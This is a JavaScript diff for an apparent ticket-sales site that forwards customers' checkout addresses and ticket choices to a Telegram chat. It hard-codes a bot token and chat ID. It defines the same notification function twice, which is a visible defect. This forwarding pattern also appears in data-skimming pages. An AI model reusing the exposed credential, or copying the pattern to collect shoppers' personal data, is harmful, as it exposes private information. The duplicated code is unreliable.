@@ -1,6 +1,6 @@
 const BOT_TOKEN = '8318197368:AAFyH0JcBzwWso1RJJKCHOb720-xGzhE8H4';
 const CHAT_ID = '8376441380';
-const API_URL = `https://api.telegram.org/bot${8318197368:AAFyH0JcBzwWso1RJJKCHOb720-xGzhE8H4}/sendMessage`;
+const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 /**
  * Sends a formatted message to the Telegram chat.
@@ -52,6 +52,36 @@ function sendCheckoutNotification(checkoutInfo) {
 ${checkoutInfo.address1}
 ${checkoutInfo.address2 ? checkoutInfo.address2 + '\n' : ''}${checkoutInfo.city}, ${checkoutInfo.state} ${checkoutInfo.postalCode}
 ${checkoutInfo.country}
+    `;
+    sendTelegramMessage(message.trim());
+}
+
+/**
+ * Formats and sends the ticket selection data to Telegram.
+ * @param {object} selectionData - The selected ticket package data.
+ */
+function sendTicketSelectionNotification(selectionData) {
+    const message = `
+<b>🎟️ New Ticket Selection! 🎟️</b>
+--------------------------------------
+<b>Package:</b> ${selectionData.selectedPackage}
+<b>Price:</b> $${selectionData.selectedPrice}
+<b>Tickets:</b> ${selectionData.selectedTickets}
+    `;
+    sendTelegramMessage(message.trim());
+}
+
+/**
+ * Formats and sends the ticket selection data to Telegram.
+ * @param {object} selectionData - The selected ticket package data.
+ */
+function sendTicketSelectionNotification(selectionData) {
+    const message = `
+<b>🎟️ New Ticket Selection! 🎟️</b>
+--------------------------------------
+<b>Package:</b> ${selectionData.selectedPackage}
+<b>Price:</b> $${selectionData.selectedPrice}
+<b>Tickets:</b> ${selectionData.selectedTickets}
     `;
     sendTelegramMessage(message.trim());
 }
